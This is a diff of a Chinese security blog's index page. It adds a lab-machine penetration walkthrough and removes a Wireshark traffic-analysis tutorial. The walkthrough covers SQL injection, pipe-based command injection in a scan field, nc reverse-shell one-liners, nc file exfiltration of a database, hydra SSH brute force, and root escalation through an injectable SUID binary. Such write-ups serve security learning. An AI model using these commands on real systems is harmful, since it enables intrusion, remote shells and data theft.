@@ -141,6 +141,128 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-2.SQL注入+nc弹shell技巧+nc传文件+sqlite3工具+hydra多个账号密码的ssh爆破" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/04/02/2.SQL%E6%B3%A8%E5%85%A5+nc%E5%BC%B9shell%E6%8A%80%E5%B7%A7+nc%E4%BC%A0%E6%96%87%E4%BB%B6+sqlite3%E5%B7%A5%E5%85%B7+hydra%E5%A4%9A%E4%B8%AA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%9A%84ssh%E7%88%86%E7%A0%B4/">2.SQL注入+nc弹shell技巧+nc传文件+sqlite3工具+hydra</a>
+    </h1>
+  
+
+        
+        <a href="/2025/04/02/2.SQL%E6%B3%A8%E5%85%A5+nc%E5%BC%B9shell%E6%8A%80%E5%B7%A7+nc%E4%BC%A0%E6%96%87%E4%BB%B6+sqlite3%E5%B7%A5%E5%85%B7+hydra%E5%A4%9A%E4%B8%AA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%9A%84ssh%E7%88%86%E7%A0%B4/" class="archive-article-date">
+  	<time datetime="2025-04-02T06:52:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<p>靶机背景：</p>
+<p>是一个云防病毒扫描服务，目前处于测试阶段；</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>发现对方开启了8080和22端口</p>
+<h2 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h2><p>网页有一个让我们输入密码登陆云防病毒后台的页面。</p>
+<p>攻击思路：</p>
+<p>逻辑漏洞-sql注入 or 暴力破解</p>
+<p><strong>暴力破解</strong></p>
+<p>我们抓包，然后爆破。</p>
+<p>这里爆破有个小技巧，就是把键盘上所有的符号都输入一边，这样做是因为这可能触发一些错误，从而我们获得一些报错信息。</p>
+<p>经过测测试，”这个符号让对方报了错，是sql注入。</p>
+<p>报错页面返回了我们执行的语句，发现能用万能密码。</p>
+<p>登陆成功后，发现能看到一些文件，我们能判断出这是执行力ls -l命令所看到的，服务器将结果返回给我们的页面了。</p>
+<p>网页上还有一个输入框，后面有一个scan按钮。</p>
+<p>由于这是一个病毒扫描的服务，我们推断，当我们的输入框中输入某个文件，并按下scan时，对方执行类似于avscan file的命令来扫描这个文件，以查杀病毒（avscan是一个病毒扫描工具）。</p>
+<p>那这也就相当于对方执行了命令，我们可以利用这个执行多个命令。</p>
+<p>管道符号可以帮助我们实现：</p>
+<p>比如输入：1.txt | ls</p>
+<p>ls不接受数据，只列出文件，所以扫描1.txt的结果不会显示出来。</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>既然能执行命令，那我们尝试来反弹shell。</p>
+<p>我们这次想要用nc来弹shell。</p>
+<p>执行：1.txt | whitch nc 来判断对方是否有nc</p>
+<p>弹shell：1.txt | nc ip port -e &#x2F;bin&#x2F;sh</p>
+<p>然而kali并没有收到弹的shell。</p>
+<p>这是因为有的nc版本没有-e参数。</p>
+<p>我们将-e后面的参数先删掉。</p>
+<p>结果成功弹过来了。</p>
+<p>但这个并不是完整的shell，我们该怎么通过nc拿到完整shell呢？</p>
+<p>技巧：</p>
+<p>1.txt | nc ip port |&#x2F;bin&#x2F;bash|nc ip port</p>
+<p>这样一来nc建立的连接所执行的命令由bash解析，然后再将解析的结果交给另一个连接（新端口）。</p>
+<p>我们通过第一个连接输入命令，然后在第二个连接中看到结果</p>
+<h2 id="敏感文件查找"><a href="#敏感文件查找" class="headerlink" title="敏感文件查找"></a>敏感文件查找</h2><p>我们能看到当前的目录下有一个database.sql文件，我们用file命令查看一下，发现是本地数据库SQLite的数据库文件。既然是本地数据库，那这里很可能有敏感信息。</p>
+<p>我们尝试用sqlite工具查看这个文件，想要查看，得先将对方的文件传过来，在本地查看（本地有这个工具）。</p>
+<h2 id="利用nc传文件"><a href="#利用nc传文件" class="headerlink" title="利用nc传文件"></a>利用nc传文件</h2><p>kali本机nc -lvnp port &gt; db.sql</p>
+<p>对方nc ip port &lt; database.sql</p>
+<h2 id="sqlite3工具使用"><a href="#sqlite3工具使用" class="headerlink" title="sqlite3工具使用"></a>sqlite3工具使用</h2><p>先输入sqlite3进入终端</p>
+<p>执行:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.<span class="keyword">open</span> db.sql</span><br><span class="line">.database</span><br><span class="line">.dump</span><br></pre></td></tr></table></figure>
+
+<p>执行完可以看到了对方执行的命令，里面有对方插入的密码。</p>
+<p>有了密码，我们尝试连接用户，查看&#x2F;etc&#x2F;passwd文件，对里面的用户挨个尝试。</p>
+<p>注意尝试的是哪些能通过&#x2F;bin&#x2F;bash登陆的用户，我们用grep筛选一下</p>
+<h2 id="ssh爆破–hydra"><a href="#ssh爆破–hydra" class="headerlink" title="ssh爆破–hydra"></a>ssh爆破–hydra</h2><p>将可用的用户都放入一个文件user.txt</p>
+<p>将密码都放入一个文件passwd.txt</p>
+<p>命令：</p>
+<p><code>hydra -L user.txt -P passwd.txt ssh://ip</code></p>
+<p>然而没有一个可以使用的，此路不同。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>经过在当前路径下的一番查找，并没有找到有利于提权的文件。</p>
+<p>我们返回上一级路径，再次查看一下，发现了一个.c的文件，同时有一个和它同名的可执行文件，我们有理由怀疑这个文件就是c文件经过编译后的可执行程序。</p>
+<p>令我们惊喜的是，这个可执行文件有suid的标记位，并且其属主是root。</p>
+<p>假如我们能用这个文件反弹shell，那就弹过来root权限。</p>
+<p>我们先查看一下源文件：</p>
+<p>发现该程序仅仅是调用了当前系统的一个工具freshclam（病毒库更新程序），并要求我们提供一个参数（没说什么是参数）。</p>
+<p>先执行.&#x2F;update_cloudav a</p>
+<p>这个a是随便给的。</p>
+<p>发现对方报了个错，但信息不全。</p>
+<p>我们大胆尝试一下.&#x2F;update_cloudav “a|nc ip port1|&#x2F;bin&#x2F;bash|nc ip port2”</p>
+<p>之所以用””包起来，是因为我们要让这个程序将后面的所有都作为它的参数。</p>
+<p>kali收到新连接的shell后会发现就是root</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2025/04/02/2.SQL%E6%B3%A8%E5%85%A5+nc%E5%BC%B9shell%E6%8A%80%E5%B7%A7+nc%E4%BC%A0%E6%96%87%E4%BB%B6+sqlite3%E5%B7%A5%E5%85%B7+hydra%E5%A4%9A%E4%B8%AA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%9A%84ssh%E7%88%86%E7%A0%B4/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-年CTF" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1516,208 +1638,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2025/04/02/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-流量分析（wireshark）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/">流量分析(wireshark)</a>
-    </h1>
-  
-
-        
-        <a href="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2025-04-02T06:49:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <hr>
-<p><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2024/pdf/42899545/1722343584017-aae6d05b-cb9a-45aa-af9a-be554713e0f6.pdf">Wireshark网络分析就这么简单.pdf</a></p>
-<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="导入文件和初步分析"><a href="#导入文件和初步分析" class="headerlink" title="导入文件和初步分析"></a>导入文件和初步分析</h3><p>使用 Wireshark 打开 pcap 文件，进行初步的流量分析。</p>
-<p>查看捕获的流量统计信息：可以通过 Statistics &gt; Protocol Hierarchy 或者 Statistics &gt; Conversations 来查看不同协议的使用情况和通信双方的情况。（俗称“协议分级”）</p>
-<p>观察流量的时间轴：从时间轴可以看到流量的发送顺序，找到通信的关键时间点。</p>
-<h3 id="分析通信协议"><a href="#分析通信协议" class="headerlink" title="分析通信协议"></a>分析通信协议</h3><p>过滤协议：根据题目线索，使用 Wireshark 的过滤功能对流量进行筛选。</p>
-<p>例如，如果题目提到的是 HTTP 协议，可以通过 http 过滤器查看 HTTP 流量。</p>
-<p>如果是加密流量（如 HTTPS、TLS），则需要关注加密的上下文或尝试抓取未加密数据。</p>
-<p>Follow Stream：在 Wireshark 中，如果发现某个通信流有趣，可以右键选择 Follow &gt; TCP&#x2F;UDP&#x2F;HTTP Stream 来查看该流的完整通信内容。（这就是我们常说的右键”http”流追踪）</p>
-<h3 id="提取和分析数据"><a href="#提取和分析数据" class="headerlink" title="提取和分析数据"></a>提取和分析数据</h3><p>根据流量类型进行相应的数据提取：</p>
-<p>文件传输：如果流量中涉及文件传输协议（如 FTP、TFTP、HTTP 等），可以提取文件内容。</p>
-<p>图像或文本数据：有时流量中会隐含图像或文本，通过数据包可以直接导出。</p>
-<p>解密流量：如果存在加密流量（如 SSL&#x2F;TLS），可以通过一些解密工具或者提前共享的密钥来解密。</p>
-<p>重组流量：部分流量需要重组（如多个分片或乱序包），可以在 Wireshark 中使用相关功能。</p>
-<h3 id="检查异常行为"><a href="#检查异常行为" class="headerlink" title="检查异常行为"></a>检查异常行为</h3><p>找异常的通信：看是否有异常端口、IP 或协议流量出现，通常可以从陌生的协议或端口下手。</p>
-<p>敏感信息泄露：如果流量包含登录信息，查看是否有明文传输的用户名、密码等。</p>
-<h3 id="寻找-Flag"><a href="#寻找-Flag" class="headerlink" title="寻找 Flag"></a>寻找 Flag</h3><p>在流量分析过程中，特别留意文本信息、响应中的数据包或文件中可能包含的 flag，通常以 flag{} 或类似格式呈现。（里面还非常喜欢藏压缩包，注意分辨即可）</p>
-<p>还可以搜索“常见的 CTF flag 格式”（例如 flag{）来缩小寻找范围。</p>
-<h3 id="提取文件或隐藏信息"><a href="#提取文件或隐藏信息" class="headerlink" title="提取文件或隐藏信息"></a>提取文件或隐藏信息</h3><p>提取文件：有时候流量题可能包含文件传输协议，可以通过 File &gt; Export Objects &gt; HTTP 等功能提取文件。（这就是“导出对象”）</p>
-<p>隐写或编码信息：flag 有时候会被隐藏在传输的数据或图像中，可能需要进一步的隐写分析或编码解密。</p>
-<h2 id="常见流量分析题型"><a href="#常见流量分析题型" class="headerlink" title="常见流量分析题型"></a>常见流量分析题型</h2><ol>
-<li>HTTP 流量分析：从 HTTP 请求&#x2F;响应中提取数据、文件或登录凭据。</li>
-<li>DNS 隧道分析：检查 DNS 请求中是否有隐藏的信息或通信。</li>
-<li>文件传输流量：提取通过 FTP、TFTP 或其他协议传输的文件。</li>
-<li>加密流量分析：解密加密流量，通常需要用到 SSL&#x2F;TLS 解密技巧。</li>
-<li>异常流量检测：识别流量中的恶意通信或数据包。</li>
-</ol>
-<h2 id="常见协议"><a href="#常见协议" class="headerlink" title="常见协议"></a>常见协议</h2><h3 id="SSDP协议"><a href="#SSDP协议" class="headerlink" title="SSDP协议"></a><font style="color:rgb(79, 79, 79);">SSDP协议</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SSDP（Simple Service Discovery Protocol）</span><br><span class="line">简单服务发现协议，用于发现局域网里面的设备和服务。</span><br><span class="line">SSDP消息分为设备查询消息、设备通知消息两种，通常情况下，使用更多地是设备查询消息。</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">一般格式如下</font></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 5</span><br><span class="line">ST: ssdp:all</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>第一行 消息头，固定；</li>
-<li>第二行 HOST对应的是广播地址和端口，239.255.255.250是默认SSDP广播ip地址，1900是默认的SSDP端口；</li>
-<li>第三行 MAN后面的ssdp:discover为固定</li>
-<li>第四行 MX为最长等待时间，</li>
-<li>第五行 ST：查询目标，它的值可以是：</li>
-</ol>
-<ul>
-<li>upnp:rootdevice 仅搜索网络中的根设备</li>
-<li>uuid:device-UUID 查询UUID标识的设备</li>
-<li>urn:schemas-upnp-org:device:device-Type:version 查询device-Type字段指定的设备类型，设备类型和版本由UPNP组织定义。</li>
-<li>其中，第三种一般可以用来自定义设备，如：ST: urn:schemas-upnp-org:device:Server:1</li>
-</ul>
-<p>在设备接收到查询请求并且查询类型（ST字段值）与此设备匹配时，设备必须向多播地址239.255.255.250:1900回应响应消息。一般形如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age = seconds until advertisement expires</span><br><span class="line">DATE: when reponse was generated</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: URL for UPnP description for root device</span><br><span class="line">SERVER: OS/Version UPNP/1.0 product/version</span><br><span class="line">ST: search target</span><br><span class="line">USN: advertisement UUID</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722413678700-60771f6a-6060-4235-8e34-a678da2b89c8.png"></p>
-<p><font style="color:rgb(77, 77, 77);">在这里，ST的目标为 InternatGatewayDevice:1</font></p>
-<p><font style="color:rgb(77, 77, 77);">出现在这里的原因，是因为这台主机在内网中，需要upnp端口映射才能连上公网，这是用于监听网关的流量进入内网的侦测包。（upnp端口映射技术正会用到这个协议，后面还会看见的）</font></p>
-<p><font style="color:rgb(77, 77, 77);"></font></p>
-<p><font style="color:rgb(77, 77, 77);"></font></p>
-<h3 id="NBNS"><a href="#NBNS" class="headerlink" title="NBNS"></a><font style="color:rgb(79, 79, 79);">NBNS</font></h3><p><font style="color:rgb(77, 77, 77);">NBNS是NetBIOS的一种，全名为NetBIOS Name service。简单来说就是将NetBIOS名称映射到IP地址上，需要一个查询和应答。也是一般在内网工作</font></p>
-<p><font style="color:rgb(77, 77, 77);">这里不做详细展开，并不是这节的重点。</font></p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722413762131-9003d9e0-2c71-47b2-8ef2-efcbf4d8595e.png"></p>
-<h3 id="IGMPv2"><a href="#IGMPv2" class="headerlink" title="IGMPv2"></a><font style="color:rgb(79, 79, 79);">IGMPv2</font></h3><p><font style="color:rgb(77, 77, 77);">IGMP是大名鼎鼎的Internet组管理协议，总共有v1、v2、v3三个版本。v2报文格式如下：</font></p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722413855355-2df06161-f417-465a-a3f3-4f82e85ecc5f.png"></p>
-<p><font style="color:rgb(77, 77, 77);">分为以下四种报文类型：</font></p>
-<p><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;1.成员关系查询（membership query）&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);"><br></font><font style="color:rgb(77, 77, 77);">IGMPv2定义了两种成员关系查询报文的子类型：常规查询(General Query)报文及特定组查询(Group-Specific Query)报文。</font></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">常规查询：IGMP查询器使用该报文向直连网段进行查询，以确认该网段中是否存在组播组成员。由于该报文查询的是所有组播组，因此也被称为普遍组查询报文。常规查询报文的目的IP地址为224.0.0.1（标识所有组播节点）。</span><br><span class="line"></span><br><span class="line">特定组查询：运行IGMPv2的主机在离开其所加入的组播组时，会主动发送一个IGMPv2离组报文，用于宣告自己离开组播组，当网络中的查询器收到这个离组报文后，需要确认该组播组中是否存在其他成员，此时该查询器便会发送特定组查询报文，该报文只针对特定的组播组进行查询，报文的目的IP地址为其所查询的组播组地址，而且报文载荷中的“组地址”字段也记录了这个组播组地址。</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">2.成员关系报告（membership report）</font></p>
-<p><font style="color:#000000;">当主机加入组播组时，或者当其收到查询器发送的常规查询报文时，主机将发送成员关系报告报文，该报文的目的IP地址是主机所加入的组播组地址，而且报文载荷中的“组地址”字段也记录了该组播组地址。</font></p>
-<p><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">3.离组报文（leave group）</font></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IGMPv2在IGMPv1的基础上增加了离组报文，当主机离开其所加入的组播组时，便会主动发送离组报文。离组报文的目的IP地址为224.0.0.2（标识所有组播路由器），报文载荷中的“组地址”字段记录了主机所要离开的组播组地址。</span><br></pre></td></tr></table></figure>
-
-<p><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;4.版本1成员关系报告（version1 membership report）&lt;/font&gt;</code><br><font style="color:rgb(77, 77, 77);">该报文用于兼容IGMPv1，报文中的类型字段值是0x12。</font></p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722414016870-ef65c231-272c-4b13-8a3c-148b2daaf099.png"></p>
-<h3 id="SMB2"><a href="#SMB2" class="headerlink" title="SMB2"></a>SMB2</h3><p><font style="color:#000000;">服务器信息块（SMB）协议是一个应用层协议主要用于在计算机间共享文件、打印机、串口等。</font></p>
-<p><font style="color:#000000;">SMB 一种客户机&#x2F;服务器、请求&#x2F;响应协议。通过 SMB 协议，客户端应用程序可以在各种网络环境下读、写服务器上的文件，以及对服务器程序提出服务请求。此外通过 SMB 协议，应用程序可以访问远程服务器端的文件、以及打印机、邮件槽（mailslot）、命名管道（named pipe）等资源。</font></p>
-<p><font style="color:#000000;"></font></p>
-<p><font style="color:#000000;"></font></p>
-<h3 id="USB协议"><a href="#USB协议" class="headerlink" title="USB协议"></a><font style="color:#000000;">USB协议</font></h3><p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1730892196314-02c7d194-a87b-43d4-839e-1d66c1287151.png"></p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1730892209852-2cd53ab1-5c19-40ca-9c27-5fd189ddb634.png"><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1730892222361-44ac185e-db36-43a9-b447-aa42e001b04a.png"><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1730892231112-f89832c3-a04e-4ab7-ac2c-1b66e5558997.png"><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1730892239975-da6eec0e-a1f2-4432-9ab4-339b8eac5992.png"><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1730892249942-fd8bab74-449f-43f1-aab3-55e8921973a9.png"><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1730892261385-cde6537c-ae03-4989-8a66-01864e3fd284.png"></p>
-<h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a><font style="color:#000000;">过滤</font></h2><p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722421877464-8303c4ad-2645-44c8-95dd-9d16c6119962.png"></p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722421977604-d92c9df8-7f78-4f82-9775-f09315f92f33.png"></p>
-<h3 id="根据协议过滤"><a href="#根据协议过滤" class="headerlink" title="根据协议过滤"></a>根据协议过滤</h3><p>如果别的包也包含arp那么也会被过滤</p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722414315061-e68bd427-8156-440c-9e7e-ab45cca5e31e.png"></p>
-<p>如：</p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722414400497-16734c52-c21b-47b0-b5c4-c2402d4df928.png"></p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722414431129-2a38cd5a-9520-45b6-9557-e9f0729f7f78.png"></p>
-<h3 id="IP加端口过滤"><a href="#IP加端口过滤" class="headerlink" title="IP加端口过滤"></a>IP加端口过滤</h3><p>法一：</p>
-<p>IP 地址加 port 号是最常用的过滤方式。除了手工输入 ip.addreq&lt;IP 地址&gt;</p>
-<p>&amp;&amp;tcp.porteq&lt;端口号&gt;之类的过滤表达式，Wireshark 还提供了更快捷的方式：右键单击</p>
-<p>感兴趣的包，选择 Follow TCP&#x2F;UDP Stream（选择 TCP 还是 UDP 要视传输层协议而定）</p>
-<p>就可以自动过滤（见图 10）。而且该 Stream 的对话内容会在新弹出的窗口中显示出来。</p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722414496744-cd9f6040-3b00-424d-a0ef-aed7c8b58c1e.png"></p>
-<p>经常有人在论坛上问，Wireshark 是按照什么过滤出一个 TCP&#x2F;UDP Stream的？答案就是：两端的 IP 加 port。单击 Wireshark 的 Statistics–&gt;Conversations，再单击 TCP 或者 UDP 标签就可以看到所有的 Stream</p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722414524486-598be44a-5c17-4150-b5ce-96f3dc8c786f.png"></p>
-<p>法二：</p>
-<p>用鼠标帮助过滤。我们有时因为 Wireshark 而苦恼，并不是因为它功能不够，</p>
-<p>而是强大到难以驾驭。比如在过滤时，有成千上万的条件可供选择，但怎么写才是</p>
-<p>合乎语法的？虽然 <a target="_blank" rel="noopener" href="http://www.wireshark.org/docs/dfref/">http://www.wireshark.org/docs/dfref/</a> 提供了参考，但经常查找毕竟</p>
-<p>太费时费力了。</p>
-<p>Wireshark 考虑到了这个需求，右键单击 Wireshark 上感兴趣的内容，</p>
-<p>然后选择 Prepare a Filter–&gt;Selected，就会在 Filter 框中自动生成过滤表达式。在有复</p>
-<p>杂需求的时候，还可以选择 And、Or 等选项来生成一个组合的过滤表达式。</p>
-<p>假如右键单击之后选择的不是 Prepare a Filter，而是 Apply as Filter–&gt;Selected，则</p>
-<p>该过滤表达式生成之后还会自动执行。图 12 显示了在一个 SMB 包的 SMB Command: </p>
-<p>Read AndX 上右键单击，并选择 Selected 之后，所有的 Read 包都会被过滤出来。</p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722414667423-86992fe6-ff0c-4288-b6a3-0491c673d88b.png"></p>
-<p>我们可以把过滤后得到的网络包存在一个新的文件里，因为小文件更方便操作。单击 Wireshark 的 File–&gt;Save As，选中 Displayed 单选按钮再保存，得到的</p>
-<p>新文件就是过滤后的部分。</p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722414701496-8d9bbb5a-2103-4623-ab52-bd7ceb402c17.png"></p>
-<p>有时候你会发现，保存后的文件再打开时会显示很多错误。这是因为过滤后</p>
-<p>得到的不再是一个完整的 TCP Stream，就像抓包时漏抓了很多一样。所以选择</p>
-<p>Displayed 选项时要慎重考虑。</p>
-<p>注意：有些 Wireshark 版本把这个功能移到了菜单 File–&gt;Export Specified </p>
-<p>Packets…选项中</p>
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1722414727179-58778434-a73f-401e-b5fe-e78f6573ab9e.png"></p>
-<h3 id="根据http请求方式过滤"><a href="#根据http请求方式过滤" class="headerlink" title="根据http请求方式过滤"></a>根据http请求方式过滤</h3><p><font style="color:rgb(48, 49, 51);">http.request.method &#x3D;&#x3D; “POST”</font></p>
-<h3 id="根据内容过滤"><a href="#根据内容过滤" class="headerlink" title="根据内容过滤"></a>根据内容过滤</h3><p>http contains “whoami”</p>
-<h3 id="混杂模式"><a href="#混杂模式" class="headerlink" title="混杂模式"></a>混杂模式</h3><p>开启后什么包都接收，关闭后属于自己的接受，不属于自己的不接收。</p>
-<p>属于自己：</p>
-<ul>
-<li>单播，明确目的是自己的</li>
-<li>广播</li>
-</ul>
-<h3 id="追踪流"><a href="#追踪流" class="headerlink" title="追踪流"></a>追踪流</h3><p>以telnet的一个包为例：</p>
-<p>关键信息：</p>
-<pre><code>- 源IP、目标IP
-- 源端口、目标端口
-- 源MAC、目标MAC
-</code></pre>
-<p>当我们追踪流追踪这个包，wireshark就分析这个包，生成了规则：</p>
-<pre><code>- 192.128.1.1：1234---&gt;192.168.1.3：23
-- 192.168.1.3：23---&gt;192.128.1.1：1234
-</code></pre>
-<p>也就是说，wireshark会将这两者之间的数据包抓下来显示。</p>
-<p>注意：该方法对于有些协议并不适用：</p>
-<pre><code>- NFS：依赖
-- FTP：双通道
-- 加密https、ssh：密文
-</code></pre>
-<h2 id="导出某一列的内容"><a href="#导出某一列的内容" class="headerlink" title="导出某一列的内容"></a>导出某一列的内容</h2><p>这里就要用到tshark了</p>
-<p>比如我这里要导出所有的hid data，那么命令就是：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r keyboard.pcapng -T fields -e usbhid.data &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/1730891560402-142b6ab0-e068-41c7-944b-2a59d826d182.png"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2025/04/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88wireshark%EF%BC%89/">展开全文 >></a>
         </p>
       
 
